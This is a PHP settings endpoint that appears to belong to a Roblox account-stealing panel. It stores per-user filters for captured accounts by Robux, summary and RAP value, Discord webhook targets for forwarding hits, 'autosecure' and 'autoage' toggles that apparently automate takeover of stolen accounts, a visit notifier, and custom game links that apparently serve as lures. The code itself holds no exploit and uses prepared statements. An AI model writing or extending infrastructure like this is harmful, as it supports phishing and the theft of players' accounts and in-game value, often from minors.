<?php

require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/account.php" );

header( "content-type: application/json; charset=utf-8" );

$info = require_account( true );
connect( );

global $db;

$body = json_decode( file_get_contents( "php://input" ), true );

if ( !is_array( $body ) )
{
    die( json_encode( [ "success" => false, "msg" => "Invalid JSON" ] ) );
};

$set = [ ];
$values = [ ];

if ( isset( $body[ "minimum" ] ) && is_array( $body[ "minimum" ] ) )
{
    if ( array_key_exists( "robux", $body[ "minimum" ] ) )
    {
        $set[ ] = "robux_filter = ?";
        $values[ ] = max( 0, (int) $body[ "minimum" ][ "robux" ] );
    };
    if ( array_key_exists( "summary", $body[ "minimum" ] ) )
    {
        $set[ ] = "summary_filter = ?";
        $values[ ] = max( 0, (int) $body[ "minimum" ][ "summary" ] );
    };
    if ( array_key_exists( "rap", $body[ "minimum" ] ) )
    {
        $set[ ] = "rap_filter = ?";
        $values[ ] = max( 0, (int) $body[ "minimum" ][ "rap" ] );
    };
};

if ( isset( $body[ "webhooks" ] ) && is_array( $body[ "webhooks" ] ) )
{
    if ( array_key_exists( "default", $body[ "webhooks" ] ) )
    {
        $set[ ] = "discord_webhook = ?";
        $values[ ] = mb_substr( trim( (string) $body[ "webhooks" ][ "default" ] ), 0, 512 );
    };
    if ( array_key_exists( "robux", $body[ "webhooks" ] ) )
    {
        $set[ ] = "robux_webhook = ?";
        $values[ ] = mb_substr( trim( (string) $body[ "webhooks" ][ "robux" ] ), 0, 512 );
    };
    if ( array_key_exists( "summary", $body[ "webhooks" ] ) )
    {
        $set[ ] = "summary_webhook = ?";
        $values[ ] = mb_substr( trim( (string) $body[ "webhooks" ][ "summary" ] ), 0, 512 );
    };
    if ( array_key_exists( "rap", $body[ "webhooks" ] ) )
    {
        $set[ ] = "rap_webhook = ?";
        $values[ ] = mb_substr( trim( (string) $body[ "webhooks" ][ "rap" ] ), 0, 512 );
    };
};

if ( isset( $body[ "dashboard" ] ) && is_array( $body[ "dashboard" ] ) )
{
    if ( array_key_exists( "anonymous", $body[ "dashboard" ] ) )
    {
        $set[ ] = "dashboard_anonymous = ?";
        $values[ ] = (int) (bool) $body[ "dashboard" ][ "anonymous" ];
    };
    if ( array_key_exists( "autosecure", $body[ "dashboard" ] ) )
    {
        $set[ ] = "dashboard_autosecure = ?";
        $values[ ] = (int) (bool) $body[ "dashboard" ][ "autosecure" ];
    };
    if ( array_key_exists( "autoage", $body[ "dashboard" ] ) )
    {
        $set[ ] = "dashboard_autoage = ?";
        $values[ ] = (int) (bool) $body[ "dashboard" ][ "autoage" ];
    };
};

if ( isset( $body[ "embed" ] ) && is_array( $body[ "embed" ] ) )
{
    if ( array_key_exists( "pingEveryone", $body[ "embed" ] ) )
    {
        $set[ ] = "discord_everyone = ?";
        $values[ ] = (int) (bool) $body[ "embed" ][ "pingEveryone" ];
    };
    if ( array_key_exists( "pingHere", $body[ "embed" ] ) )
    {
        $set[ ] = "discord_here = ?";
        $values[ ] = (int) (bool) $body[ "embed" ][ "pingHere" ];
    };
    if ( array_key_exists( "visitNoti", $body[ "embed" ] ) )
    {
        $set[ ] = "discord_visit_notifier = ?";
        $values[ ] = (int) (bool) $body[ "embed" ][ "visitNoti" ];
    };
};

if ( array_key_exists( "customGameLink", $body ) )
{
    $set[ ] = "custom_game_links = ?";
    $values[ ] = mb_substr( trim( (string) $body[ "customGameLink" ] ), 0, 512 );
};

if ( $set === [ ] )
{
    http_response_code( 400 );
    die( json_encode( [ "success" => false, "msg" => "Nothing to update" ] ) );
};

$values[ ] = (int) $info[ "id" ];
$sql = "UPDATE users SET " . implode( ", ", $set ) . " WHERE id = ?";
$db->prepare( $sql )->execute( $values );

die( json_encode( [ "success" => true, "msg" => "Settings updated successfully!" ] ) );
?>
